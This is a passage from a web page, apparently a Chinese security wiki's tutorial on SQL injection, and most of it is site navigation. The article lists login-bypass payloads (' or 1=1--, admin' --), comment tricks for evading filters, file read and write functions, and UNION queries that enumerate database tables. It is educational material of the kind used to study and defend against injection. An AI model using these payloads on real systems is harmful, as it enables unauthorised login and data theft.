class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_8 type=checkbox id=__nav_3_8> <label class=md-nav__link for=__nav_3_8> 数字签名 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=数字签名 data-md-level=2> <label class=md-nav__title for=__nav_3_8> <span class="md-nav__icon md-icon"></span> 数字签名 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../crypto/signature/introduction/ class=md-nav__link> 数字签名 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_8_2 type=checkbox id=__nav_3_8_2> <label class=md-nav__link for=__nav_3_8_2> RSA 数字签名 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="RSA 数字签名" data-md-level=3> <label class=md-nav__title for=__nav_3_8_2> <span class="md-nav__icon md-icon"></span> RSA 数字签名 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../crypto/signature/rsa/ class=md-nav__link> RSA 数字签名 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_8_3 type=checkbox id=__nav_3_8_3> <label class=md-nav__link for=__nav_3_8_3> ElGamal 数字签名 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="ElGamal 数字签名" data-md-level=3> <label class=md-nav__title for=__nav_3_8_3> <span class="md-nav__icon md-icon"></span> ElGamal 数字签名 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../crypto/signature/elgamal/ class=md-nav__link> ElGamal </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_8_4 type=checkbox id=__nav_3_8_4> <label class=md-nav__link for=__nav_3_8_4> DSA 数字签名 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="DSA 数字签名" data-md-level=3> <label class=md-nav__title for=__nav_3_8_4> <span class="md-nav__icon md-icon"></span> DSA 数字签名 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../crypto/signature/dsa/ class=md-nav__link> DSA </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_9 type=checkbox id=__nav_3_9> <label class=md-nav__link for=__nav_3_9> 攻击思想总结 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=攻击思想总结 data-md-level=2> <label class=md-nav__title for=__nav_3_9> <span class="md-nav__icon md-icon"></span> 攻击思想总结 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../crypto/attack-summary/attack-mode/ class=md-nav__link> 简介 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_9_2 type=checkbox id=__nav_3_9_2> <label class=md-nav__link for=__nav_3_9_2> 中间相遇攻击 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=中间相遇攻击 data-md-level=3> <label class=md-nav__title for=__nav_3_9_2> <span class="md-nav__icon md-icon"></span> 中间相遇攻击 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../crypto/attack-summary/meet-in-the-middle/ class=md-nav__link> 中间相遇攻击 - MITM </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_9_3 type=checkbox id=__nav_3_9_3> <label class=md-nav__link for=__nav_3_9_3> 比特攻击 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=比特攻击 data-md-level=3> <label class=md-nav__title for=__nav_3_9_3> <span class="md-nav__icon md-icon"></span> 比特攻击 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../crypto/attack-summary/bit-attack/ class=md-nav__link> 比特攻击 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_10 type=checkbox id=__nav_3_10> <label class=md-nav__link for=__nav_3_10> 证书格式 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=证书格式 data-md-level=2> <label class=md-nav__title for=__nav_3_10> <span class="md-nav__icon md-icon"></span> 证书格式 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../crypto/certificate/introduction/ class=md-nav__link> 证书格式 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4 type=checkbox id=__nav_4> <label class=md-nav__link for=__nav_4> Development <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Development data-md-level=1> <label class=md-nav__title for=__nav_4> <span class="md-nav__icon md-icon"></span> Development </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../development/introduction/ class=md-nav__link> Conflux应用开发入门 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_2 type=checkbox id=__nav_4_2> <label class=md-nav__link for=__nav_4_2> 生态开发激励 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=生态开发激励 data-md-level=2> <label class=md-nav__title for=__nav_4_2> <span class="md-nav__icon md-icon"></span> 生态开发激励 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../development/incentive-guide/ class=md-nav__link> 生态激励指南 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3 type=checkbox id=__nav_4_3> <label class=md-nav__link for=__nav_4_3> 开发工具及相关资源介绍 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=开发工具及相关资源介绍 data-md-level=2> <label class=md-nav__title for=__nav_4_3> <span class="md-nav__icon md-icon"></span> 开发工具及相关资源介绍 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../development/tools/ class=md-nav__link> 开发工具 </a> </li> <li class=md-nav__item> <a href=../../development/resources/ class=md-nav__link> 开发资源 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_4 type=checkbox id=__nav_4_4> <label class=md-nav__link for=__nav_4_4> ConfluxScan教程 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=ConfluxScan教程 data-md-level=2> <label class=md-nav__title for=__nav_4_4> <span class="md-nav__icon md-icon"></span> ConfluxScan教程 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../development/apply-contract-fee/ class=md-nav__link> 为合约申请Conflux赞助额度（合约代付） </a> </li> <li class=md-nav__item> <a href=../../development/address-NFT/ class=md-nav__link> NFT查看器教程 </a> </li> <li class=md-nav__item> <a href=../../development/register-contract-and-token-display/ class=md-nav__link> 如何在Scan上注册合约和代币展示 </a> </li> <li class=md-nav__item> <a href=../../development/get-lp-token-address/ class=md-nav__link> 查找LP代币的合约地址 </a> </li> <li class=md-nav__item> <a href=../../development/internal-transaction/ class=md-nav__link> 交易分析 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_5 type=checkbox id=__nav_4_5> <label class=md-nav__link for=__nav_4_5> Portal钱包教程 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Portal钱包教程 data-md-level=2> <label class=md-nav__title for=__nav_4_5> <span class="md-nav__icon md-icon"></span> Portal钱包教程 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../development/portal/ class=md-nav__link> Portal安装配置步骤 </a> </li> <li class=md-nav__item> <a href=../../development/portal-setting/ class=md-nav__link> Portal钱包常用功能解析 </a> </li> <li class=md-nav__item> <a href=../../development/add-token-to-portal/ class=md-nav__link> 添加CRC20代币到Portal的方法与步骤 </a> </li> <li class=md-nav__item> <a href=../../development/portal-faucet/ class=md-nav__link> ConfluxPortal切换为测试网领取测试币教程 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_5 type=checkbox id=__nav_5> <label class=md-nav__link for=__nav_5> Ecosystem <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Ecosystem data-md-level=1> <label class=md-nav__title for=__nav_5> <span class="md-nav__icon md-icon"></span> Ecosystem </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../ecosystem/introduction/ class=md-nav__link> 生态介绍 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_5_2 type=checkbox id=__nav_5_2> <label class=md-nav__link for=__nav_5_2> Conflux基础生态教程 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Conflux基础生态教程 data-md-level=2> <label class=md-nav__title for=__nav_5_2> <span class="md-nav__icon md-icon"></span> Conflux基础生态教程 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../ecosystem/wcfx-cfx-exchange/ class=md-nav__link> WCFX与CFX代币互换 </a> </li> <li class=md-nav__item> <a href=../../ecosystem/governance/ class=md-nav__link> Staking合约的质押与解质押 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_5_3 type=checkbox id=__nav_5_3> <label class=md-nav__link for=__nav_5_3> 常见生态介绍及教程 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=常见生态介绍及教程 data-md-level=2> <label class=md-nav__title for=__nav_5_3> <span class="md-nav__icon md-icon"></span> 常见生态介绍及教程 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../ecosystem/tspace/ class=md-nav__link> Tspace 4.0 NFT平台 </a> </li> <li class=md-nav__item> <a href=../../ecosystem/nft-box/ class=md-nav__link> NFTBox创新型资产交互平台 </a> </li> <li class=md-nav__item> <a href=../../ecosystem/shuttleflow/ class=md-nav__link> Shuttleflow跨链工具 </a> </li> <li class=md-nav__item> <a href=../../ecosystem/moonswap/ class=md-nav__link> moonswap生态 </a> </li> <li class=md-nav__item> <a href=../../ecosystem/phantom/ class=md-nav__link> Phantom协议 </a> </li> <li class=md-nav__item> <a href=../../ecosystem/dan/ class=md-nav__link> 炼丹西游 </a> </li> <li class=md-nav__item> <a href=../../ecosystem/guguo/ class=md-nav__link> 古国序列 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_6 type=checkbox id=__nav_6 checked> <label class=md-nav__link for=__nav_6> Web <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Web data-md-level=1> <label class=md-nav__title for=__nav_6> <span class="md-nav__icon md-icon"></span> Web </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../introduction/ class=md-nav__link> Web 简介 </a> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_6_2 type=checkbox id=__nav_6_2 checked> <label class=md-nav__link for=__nav_6_2> SQL 注入 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="SQL 注入" data-md-level=2> <label class=md-nav__title for=__nav_6_2> <span class="md-nav__icon md-icon"></span> SQL 注入 </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--active"> <input class="md-nav__toggle md-toggle" data-md-toggle=toc type=checkbox id=__toc> <label class="md-nav__link md-nav__link--active" for=__toc> SQL 注入 <span class="md-nav__icon md-icon"></span> </label> <a href=./ class="md-nav__link md-nav__link--active"> SQL 注入 </a> <nav class="md-nav md-nav--secondary" aria-label=目录> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> 目录 </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#_1 class=md-nav__link> 基本概念 </a> </li> <li class=md-nav__item> <a href=#_2 class=md-nav__link> 常用工具 </a> </li> <li class=md-nav__item> <a href=#_3 class=md-nav__link> 注入常见参数 </a> </li> <li class=md-nav__item> <a href=#_4 class=md-nav__link> 语法参考与小技巧 </a> <nav class=md-nav aria-label=语法参考与小技巧> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_5 class=md-nav__link> 行间注释 </a> </li> <li class=md-nav__item> <a href=#_6 class=md-nav__link> 行内注释 </a> </li> <li class=md-nav__item> <a href=#_7 class=md-nav__link> 字符串编码 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_8 class=md-nav__link> 后台万能密码 </a> </li> <li class=md-nav__item> <a href=#_9 class=md-nav__link> 注入语句备忘 </a> <nav class=md-nav aria-label=注入语句备忘> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_10 class=md-nav__link> 数据库名 </a> </li> <li class=md-nav__item> <a href=#_11 class=md-nav__link> 表名 </a> </li> <li class=md-nav__item> <a href=#_12 class=md-nav__link> 列名 </a> </li> <li class=md-nav__item> <a href=#_13 class=md-nav__link> 根据列名查询所在的表 </a> </li> <li class=md-nav__item> <a href=#_14 class=md-nav__link> 绕过引号限制 </a> </li> <li class=md-nav__item> <a href=#_15 class=md-nav__link> 绕过字符串黑名单 </a> </li> <li class=md-nav__item> <a href=#_16 class=md-nav__link> 条件语句 </a> </li> <li class=md-nav__item> <a href=#_17 class=md-nav__link> 延时函数 </a> </li> <li class=md-nav__item> <a href=#order-by class=md-nav__link> order by 后的注入 </a> </li> <li class=md-nav__item> <a href=#_18 class=md-nav__link> 宽字节注入 </a> </li> <li class=md-nav__item> <a href=#dnslog class=md-nav__link> DNSLOG注入 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_19 class=md-nav__link> 参考资料 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_6_3 type=checkbox id=__nav_6_3> <label class=md-nav__link for=__nav_6_3> XSS 跨站脚本攻击 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="XSS 跨站脚本攻击" data-md-level=2> <label class=md-nav__title for=__nav_6_3> <span class="md-nav__icon md-icon"></span> XSS 跨站脚本攻击 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../xss/ class=md-nav__link> XSS </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_6_4 type=checkbox id=__nav_6_4> <label class=md-nav__link for=__nav_6_4> CSRF 跨站请求伪造 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="CSRF 跨站请求伪造" data-md-level=2> <label class=md-nav__title for=__nav_6_4> <span class="md-nav__icon md-icon"></span> CSRF 跨站请求伪造 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../csrf/ class=md-nav__link> CSRF </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_6_5 type=checkbox id=__nav_6_5> <label class=md-nav__link for=__nav_6_5> SSRF 服务端请求伪造 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="SSRF 服务端请求伪造" data-md-level=2> <label class=md-nav__title for=__nav_6_5> <span class="md-nav__icon md-icon"></span> SSRF 服务端请求伪造 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../ssrf/ class=md-nav__link> SSRF </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_6_6 type=checkbox id=__nav_6_6> <label class=md-nav__link for=__nav_6_6> PHP 代码审计 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="PHP 代码审计" data-md-level=2> <label class=md-nav__title for=__nav_6_6> <span class="md-nav__icon md-icon"></span> PHP 代码审计 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../php/php/ class=md-nav__link> PHP 代码审计 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_7 type=checkbox id=__nav_7> <label class=md-nav__link for=__nav_7> BlockChain <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=BlockChain data-md-level=1> <label class=md-nav__title for=__nav_7> <span class="md-nav__icon md-icon"></span> BlockChain </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../blockchain/introduction/ class=md-nav__link> BlockChain Security Overview </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_7_2 type=checkbox id=__nav_7_2> <label class=md-nav__link for=__nav_7_2> Ethereum Security <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Ethereum Security" data-md-level=2> <label class=md-nav__title for=__nav_7_2> <span class="md-nav__icon md-icon"></span> Ethereum Security </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../blockchain/ethereum/introduction/ class=md-nav__link> Ethereum Overview </a> </li> <li class=md-nav__item> <a href=../../blockchain/ethereum/basics/ class=md-nav__link> Ethereum Basics </a> </li> <li class=md-nav__item> <a href=../../blockchain/ethereum/selector-encoding/ class=md-nav__link> Function Selector and Argument Encoding </a> </li> <li class=md-nav__item> <a href=../../blockchain/ethereum/storage/ class=md-nav__link> Ethereum Storage </a> </li> <li class=md-nav__item> <a href=../../blockchain/ethereum/opcodes/ class=md-nav__link> Ethereum Opcodes </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_7_2_6 type=checkbox id=__nav_7_2_6> <label class=md-nav__link for=__nav_7_2_6> Known Attacks <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Known Attacks" data-md-level=3> <label class=md-nav__title for=__nav_7_2_6> <span class="md-nav__icon md-icon"></span> Known Attacks </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../blockchain/ethereum/attacks/introduction/ class=md-nav__link> Introduction </a> </li> <li class=md-nav__item> <a href=../../blockchain/ethereum/attacks/re-entrancy/ class=md-nav__link> Re-Entrancy </a> </li> <li class=md-nav__item> <a href=../../blockchain/ethereum/attacks/overflow-underflow/ class=md-nav__link> Integer Overflow and Underflow </a> </li> <li class=md-nav__item> <a href=../../blockchain/ethereum/attacks/randomness/ class=md-nav__link> Randomness </a> </li> <li class=md-nav__item> <a href=../../blockchain/ethereum/attacks/airdrop-hunting/ class=md-nav__link> Airdrop Hunting </a> </li> <li class=md-nav__item> <a href=../../blockchain/ethereum/attacks/shortaddress/ class=md-nav__link> Short Address Attack </a> </li> <li class=md-nav__item> <a href=../../blockchain/ethereum/attacks/delegatecall/ class=md-nav__link> Delegatecall </a> </li> <li class=md-nav__item> <a href=../../blockchain/ethereum/attacks/uninitialized-storage-pointer/ class=md-nav__link> Uninitialized Storage Pointer </a> </li> <li class=md-nav__item> <a href=../../blockchain/ethereum/attacks/arbitrarywrite/ class=md-nav__link> Arbitrary Writing </a> </li> <li class=md-nav__item> <a href=../../blockchain/ethereum/attacks/create2/ class=md-nav__link> CREATE2 </a> </li> <li class=md-nav__item> <a href=../../blockchain/ethereum/attacks/jump-oriented-programming/ class=md-nav__link> Jump Oriented Programming </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../blockchain/ethereum/reverse/ class=md-nav__link> Smart Contract Reverse </a> </li> <li class=md-nav__item> <a href=../../blockchain/ethereum/challenges/ class=md-nav__link> 区块链比赛题目 </a> </li> <li class=md-nav__item> <a href=../../blockchain/ethereum/resources/ class=md-nav__link> 学习资源 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_7_3 type=checkbox id=__nav_7_3> <label class=md-nav__link for=__nav_7_3> Public Blockchain Security <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Public Blockchain Security" data-md-level=2> <label class=md-nav__title for=__nav_7_3> <span class="md-nav__icon md-icon"></span> Public Blockchain Security </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../blockchain/publicblockchain/introduction/ class=md-nav__link> Public Blockchain Security Overview </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_8 type=checkbox id=__nav_8> <label class=md-nav__link for=__nav_8> NFT <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=NFT data-md-level=1> <label class=md-nav__title for=__nav_8> <span class="md-nav__icon md-icon"></span> NFT </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../nft/introduction/ class=md-nav__link> 初识NFT </a> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=sidebar data-md-type=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--secondary" aria-label=目录> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> 目录 </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#_1 class=md-nav__link> 基本概念 </a> </li> <li class=md-nav__item> <a href=#_2 class=md-nav__link> 常用工具 </a> </li> <li class=md-nav__item> <a href=#_3 class=md-nav__link> 注入常见参数 </a> </li> <li class=md-nav__item> <a href=#_4 class=md-nav__link> 语法参考与小技巧 </a> <nav class=md-nav aria-label=语法参考与小技巧> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_5 class=md-nav__link> 行间注释 </a> </li> <li class=md-nav__item> <a href=#_6 class=md-nav__link> 行内注释 </a> </li> <li class=md-nav__item> <a href=#_7 class=md-nav__link> 字符串编码 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_8 class=md-nav__link> 后台万能密码 </a> </li> <li class=md-nav__item> <a href=#_9 class=md-nav__link> 注入语句备忘 </a> <nav class=md-nav aria-label=注入语句备忘> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_10 class=md-nav__link> 数据库名 </a> </li> <li class=md-nav__item> <a href=#_11 class=md-nav__link> 表名 </a> </li> <li class=md-nav__item> <a href=#_12 class=md-nav__link> 列名 </a> </li> <li class=md-nav__item> <a href=#_13 class=md-nav__link> 根据列名查询所在的表 </a> </li> <li class=md-nav__item> <a href=#_14 class=md-nav__link> 绕过引号限制 </a> </li> <li class=md-nav__item> <a href=#_15 class=md-nav__link> 绕过字符串黑名单 </a> </li> <li class=md-nav__item> <a href=#_16 class=md-nav__link> 条件语句 </a> </li> <li class=md-nav__item> <a href=#_17 class=md-nav__link> 延时函数 </a> </li> <li class=md-nav__item> <a href=#order-by class=md-nav__link> order by 后的注入 </a> </li> <li class=md-nav__item> <a href=#_18 class=md-nav__link> 宽字节注入 </a> </li> <li class=md-nav__item> <a href=#dnslog class=md-nav__link> DNSLOG注入 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_19 class=md-nav__link> 参考资料 </a> </li> </ul> </nav> </div> </div> </div> <div class=md-content data-md-component=content> <article class="md-content__inner md-typeset"> <a href=https://github.com/conflux-wiki/conflux-wiki/blob/master/docs/zh/docs/web/sqli.md title=编辑此页 class="md-content__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg> </a> <h1 id=sql>SQL 注入<a class=headerlink href=#sql title="Permanent link">&para;</a></h1> <h2 id=_1>基本概念<a class=headerlink href=#_1 title="Permanent link">&para;</a></h2> <ul> <li>SQL 注入是一种将 SQL 代码插入或添加到应用（用户）的输入参数中，之后再将这些参数传递给后台的 SQL 服务器加以解析并执行的攻击。</li> <li>攻击者能够修改 SQL 语句，该进程将与执行命令的组件（如数据库服务器、应用服务器或 WEB 服务器）拥有相同的权限。</li> <li>如果 WEB 应用开发人员无法确保在将从 WEB 表单、cookie、输入参数等收到的值传递给 SQL 查询（该查询在数据库服务器上执行）之前已经对其进行过验证，通常就会出现 SQL 注入漏洞。</li> </ul> <h2 id=_2>常用工具<a class=headerlink href=#_2 title="Permanent link">&para;</a></h2> <ul> <li>Burp Suite：<a href=http://drops.xmd5.com/static/drops/tools-1548.html>Burp Suite 使用介绍</a></li> <li>Tamper Data (Firefox addon)</li> <li>HackBar (Firefox addon)</li> <li>sqlmap：<a href=http://drops.xmd5.com/static/drops/tips-143.html>sqlmap 用户手册</a></li> </ul> <h2 id=_3>注入常见参数<a class=headerlink href=#_3 title="Permanent link">&para;</a></h2> <ul> <li><code>user()</code>：当前数据库用户</li> <li><code>database()</code>：当前数据库名</li> <li><code>version()</code>：当前使用的数据库版本</li> <li><code>@@datadir</code>：数据库存储数据路径</li> <li><code>concat()</code>：联合数据，用于联合两条数据结果。如 <code>concat(username,0x3a,password)</code></li> <li><code>group_concat()</code>：和 <code>concat()</code> 类似，如 <code>group_concat(DISTINCT+user,0x3a,password)</code>，用于把多条数据一次注入出来</li> <li><code>concat_ws()</code>：用法类似</li> <li><code>hex()</code> 和 <code>unhex()</code>：用于 hex 编码解码</li> <li><code>load_file()</code>：以文本方式读取文件，在 Windows 中，路径设置为 <code>\\</code></li> <li><code>select xxoo into outfile '路径'</code>：权限较高时可直接写文件</li> </ul> <h2 id=_4>语法参考与小技巧<a class=headerlink href=#_4 title="Permanent link">&para;</a></h2> <h3 id=_5>行间注释<a class=headerlink href=#_5 title="Permanent link">&para;</a></h3> <ul> <li> <p><code>--</code></p> <div class=highlight><pre><span></span><code><span class=k>DROP</span> <span class=n>sampletable</span><span class=p>;</span><span class=c1>--</span>
-</code></pre></div> </li> <li> <p><code>#</code></p> <div class=highlight><pre><span></span><code><span class=k>DROP</span> <span class=n>sampletable</span><span class=p>;</span><span class=o>#</span>
-</code></pre></div> </li> </ul> <h3 id=_6>行内注释<a class=headerlink href=#_6 title="Permanent link">&para;</a></h3> <ul> <li> <p><code>/*注释内容*/</code></p> <div class=highlight><pre><span></span><code><span class=k>DROP</span><span class=cm>/*comment*/</span><span class=n>sampletable</span><span class=o>`</span>   <span class=n>DR</span><span class=cm>/**/</span><span class=n>OP</span><span class=cm>/*绕过过滤*/</span><span class=n>sampletable</span><span class=o>`</span>   <span class=k>SELECT</span><span class=cm>/*替换空格*/</span><span class=n>password</span><span class=cm>/**/</span><span class=k>FROM</span><span class=cm>/**/</span><span class=n>Members</span>
-</code></pre></div> </li> <li> <p><code>/*! MYSQL专属 */</code></p> <div class=highlight><pre><span></span><code><span class=k>SELECT</span> <span class=cm>/*!32302 1/0, */</span> <span class=mi>1</span> <span class=k>FROM</span> <span class=n>tablename</span>
-</code></pre></div> </li> </ul> <h3 id=_7>字符串编码<a class=headerlink href=#_7 title="Permanent link">&para;</a></h3> <ul> <li><code>ASCII()</code>：返回字符的 ASCII 码值</li> <li><code>CHAR()</code>：把整数转换为对应的字符</li> </ul> <h2 id=_8>后台万能密码<a class=headerlink href=#_8 title="Permanent link">&para;</a></h2> <ul> <li><code>admin' --</code></li> <li><code>admin' #</code></li> <li><code>admin'/*</code></li> <li><code>' or 1=1--</code></li> <li><code>' or 1=1#</code></li> <li><code>' or 1=1/*</code></li> <li><code>') or '1'='1--</code></li> <li><code>') or ('1'='1--</code></li> <li>以不同的用户登陆 <code>' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--</code></li> </ul> <h2 id=_9>注入语句备忘<a class=headerlink href=#_9 title="Permanent link">&para;</a></h2> <h3 id=_10>数据库名<a class=headerlink href=#_10 title="Permanent link">&para;</a></h3> <div class=highlight><pre><span></span><code><span class=k>SELECT</span> <span class=k>database</span><span class=p>();</span>
-<span class=k>SELECT</span> <span class=k>schema_name</span> <span class=k>FROM</span> <span class=n>information_schema</span><span class=p>.</span><span class=n>schemata</span><span class=p>;</span>
-</code></pre></div> <h3 id=_11>表名<a class=headerlink href=#_11 title="Permanent link">&para;</a></h3> <ul> <li> <p>union 查询</p> <div class=highlight><pre><span></span><code><span class=c1>--MySQL 4版本时用version=9，MySQL 5版本时用version=10</span>
-<span class=k>UNION</span> <span class=k>SELECT</span> <span class=n>GROUP_CONCAT</span><span class=p>(</span><span class=k>table_name</span><span class=p>)</span> <span class=k>FROM</span> <span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span> <span class=k>WHERE</span> <span class=k>version</span><span class=o>=</span><span class=mi>10</span><span class=p>;</span>   <span class=cm>/* 列出当前数据库中的表 */</span>
-<span class=k>UNION</span> <span class=k>SELECT</span> <span class=k>TABLE_NAME</span> <span class=k>FROM</span> <span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span> <span class=k>WHERE</span> <span class=n>TABLE_SCHEMA</span><span class=o>=</span><span class=k>database</span><span class=p>();</span>   <span class=cm>/* 列出所有用户自定义数据库中的表 */</span>
